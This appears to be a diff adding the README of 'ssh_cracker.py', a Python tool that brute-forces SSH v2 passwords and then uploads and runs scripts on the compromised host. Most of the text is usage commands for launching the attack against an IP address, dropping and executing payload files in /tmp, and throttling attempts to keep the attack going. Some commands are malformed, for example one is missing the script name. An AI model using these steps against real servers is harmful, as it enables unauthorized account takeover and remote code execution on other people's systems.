@@ -1,0 +1,98 @@
+OfensiveSecurity
+================
+
+Brute Forcing SSHD v2
+
+
+Platform: Linux
+
+Python: Python version 2.6.6 was used during development.
+         You can try other versions, it will work if you
+         are able to import all the dependable modules.
+
+SSH version: This script works only with ssh version 2
+
+
+
+QUICK OVERVIEW:
+
+This script runs a brute force attack on an SSH server version 2, and uploads and executes a file
+
+after obtaining a valid passwordi. If connection to the SSH server is lost() during the brute force,
+
+the script will wait and try to reconnect After each 10 seconds,  and the brute force will continue from the last failed
+
+password in the password list only if able to connect back to the SSH server. If the no route is found, the script will keep
+
+trying to connect back until you cancel it with "Control-C". You can change the 10 seconds with the (-s) or (--sleep).
+
+All dependable modules are installed by default when installing python except paramiko, run this command in a terminal to install it:
+
+
+Shell>  yum –y install python-paramiko                  # Red-Hat, CentOS...
+
+Or
+
+Shell> apt-get –y install python-paramiko               # Debian, Ubuntu...
+
+Or
+
+You can install it from source
+
+
+
+
+
+
+
+        HOWTO:
+
+1-      Print usage of the script:
+
+        Shell> python ssh_cracker.py
+
+2-      Print available options
+
+        Shell> python ssh_cracker -h
+
+3-      To lunch a brute force attack:
+
+        Shell> python ssh_cracker.py  -i 1.2.3.4 –u user –L password_list
+
+4-      To lunch a brute force attack and upload and execute a file after obtaining a valid password:
+
+        Shell> python ssh_cracker –i 1.2.3.4 –u user –L password_list –l script.sh –r /tmp
+        Shell> python ssh_cracker –i 1.2.3.4 –u user –L password_list –l script.sh –r /tmp –c bash
+        Shell> python ssh_cracker –i 1.2.3.4 –u user –L password_list –l ruby.rb –r /tmp –c ruby
+
+Specify the file you want to upload and execute with the “-l” option and the directory where to upload it with “-r” option.
+
+By default a shell script is executed with the “sh” command and python script is of course executed with the “python” command but the file name should have an extension
+
+that identifies if it’s a shell or python script. But you can override this behavior by specifying your command with the (-c) option.
+
+        NOTE: You must have permission to the file you file you want to upload and to the directory where you're uploading it.
+
+5-      Uploading more than one file after cracking the password:
+
+        Shell> python ssh_cracker –i 1.2.3.4 –u user –L password_list –l script.sh –r /tmp –c bash –f “file1,file2,file3”
+
+        This is useful if you want to involve other files(config file, other codes...) in the execution of the file uploaded with the (-l) option
+
+6-      Advanced options:
+
+        Shell>  python ssh_cracker –i 1.2.3.4 –u user –L password_list –l script.sh –r /tmp  -w 3  -a 10 –s 15
+
+        (-w)  : 3 seconds between each attempt
+        (-a) : sleep after 10 attempts (default sleep time is 10 seconds)
+        (-s)  : Sleep for 15 secs and try again when connection is interupted
+
+
+7-      File Transfer:
+
+        Shell> python -i 1.2.3.4 -u username -p password -f "file1,file2,file3,file4"  -r remote_dir
+
+BUG:    If you experience any error while running this script, please provide an identique way to
+        reproduce the same error, that will make it easy for me to narrow down the issue.
+
+Contact: abdelsako@live.com
